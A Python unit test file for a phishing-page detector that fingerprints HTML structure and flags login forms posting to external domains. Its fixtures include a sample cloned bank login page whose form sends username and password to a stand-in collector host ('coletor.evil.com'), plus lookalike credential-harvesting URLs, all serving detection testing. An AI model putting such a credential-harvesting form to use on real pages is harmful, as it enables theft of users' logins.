import os
import sys
import unittest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "src"))

from mhf import estrutural  # noqa: E402

LOGIN_LEGITIMO = b"""
<html><head><title>Banco</title><script>var t=1;</script></head>
<body>
  <div id="topo" class="header-a1b2"><img src="logo.png"></div>
  <form action="/entrar" method="post">
    <input type="email" name="usuario" placeholder="E-mail">
    <input type="password" name="senha">
    <input type="hidden" name="csrf" value="abc123">
    <button type="submit">Entrar</button>
  </form>
  <!-- comentario -->
  <a href="/ajuda">Ajuda</a>
</body></html>
"""

# Clone de phishing: mesmo esqueleto, mas ids/classes/textos diferentes, outro token,
# input type="text" no lugar de "email" e action apontando para fora.
CLONE_PHISHING = b"""
<html><body>
  <div id="x9" class="zz"><img src="https://cdn.evil/logo.png"></div>
  <form action="https://coletor.evil.com/post.php">
    <input type="text" name="u">
    <input type="password" name="p">
    <input type="hidden" name="csrf" value="OUTRO">
    <button type="submit">Acessar</button>
  </form>
  <a href="#">Precisa de ajuda?</a>
</body></html>
"""

PAGINA_DIFERENTE = b"""
<html><body>
  <nav><ul><li><a href="/">Inicio</a></li><li><a href="/blog">Blog</a></li></ul></nav>
  <article><h1>Noticia</h1><p>Texto</p><p>Mais texto</p></article>
</body></html>
"""


class TestEstrutural(unittest.TestCase):
    def setUp(self):
        self.legit = estrutural.extrair(LOGIN_LEGITIMO, "https://www.banco.com.br/login")
        self.clone = estrutural.extrair(CLONE_PHISHING, "http://banco-seguro.xyz/login")
        self.outra = estrutural.extrair(PAGINA_DIFERENTE, "https://blog.exemplo.com")

    def test_clone_tem_mesmo_hash_canonico(self):
        # Atributos voláteis, textos, comentários, scripts e campos ocultos não afetam o hash
        self.assertEqual(self.legit.hash_canonico, self.clone.hash_canonico)

    def test_pagina_diferente_tem_hash_diferente(self):
        self.assertNotEqual(self.legit.hash_canonico, self.outra.hash_canonico)

    def test_xpaths_criticos(self):
        self.assertIn("/body/form/input[password]", self.legit.xpaths_criticos)
        self.assertIn("/body/form/button[submit]", self.legit.xpaths_criticos)
        self.assertEqual(self.outra.xpaths_criticos, set())

    def test_contagens(self):
        self.assertEqual(self.legit.contagens["campos_senha"], 1)
        self.assertEqual(self.legit.contagens["inputs"], 2)  # hidden é ignorado
        self.assertEqual(self.legit.contagens["forms_action_externa"], 0)
        self.assertEqual(self.clone.contagens["forms_action_externa"], 1)

    def test_similaridades(self):
        perto = estrutural.comparar(self.legit, self.clone)
        longe = estrutural.comparar(self.legit, self.outra)
        self.assertEqual(perto["jaccard_caminhos"], 1.0)
        self.assertLess(longe["jaccard_caminhos"], 0.2)
        self.assertGreater(perto["sim_contagens"], longe["sim_contagens"])

    def test_forms_action_externa_pelo_dominio_registravel(self):
        def externas(action, url):
            pagina = f'<html><body><form action="{action}"><input type="password"></form></body></html>'
            return estrutural.extrair(pagina.encode(), url).contagens["forms_action_externa"]

        casos = [
            # (action, URL da página, esperado)
            ("https://golpe.com.br/post.php", "https://www.itau.com.br/", 1),     # antes: "com.br" == "com.br" → interno
            ("https://evilpaypal.com/x", "https://www.paypal.com/signin", 1),     # antes: endswith("paypal.com") → interno
            ("https://secure.itau.com.br/login", "https://www.itau.com.br/", 0),  # subdomínio do mesmo dono
            ("//coletor.evil.net/p", "https://www.paypal.com/", 1),               # sem esquema, mas com host
            ("/entrar", "https://www.paypal.com/", 0),                            # relativo: mesma página
            ("", "https://www.paypal.com/", 0),
            ("https://ojoro2.blob.core.windows.net/a", "https://outro.blob.core.windows.net/", 1),  # clientes diferentes
            ("https://WWW.PAYPAL.COM:443/x", "https://paypal.com/", 0),          # maiúsculas e porta
            ("https://evil.net/x", "", 0),                                        # sem URL da página: não dá para saber
        ]
        for action, url, esperado in casos:
            with self.subTest(action=action, url=url):
                self.assertEqual(externas(action, url), esperado)

    def test_html_vazio(self):
        self.assertIsNone(estrutural.extrair(b"   "))

    def test_ida_e_volta_dict(self):
        d = self.legit.para_dict()
        self.assertEqual(estrutural.ImpressaoEstrutural.de_dict(d), self.legit)


if __name__ == "__main__":
    unittest.main()
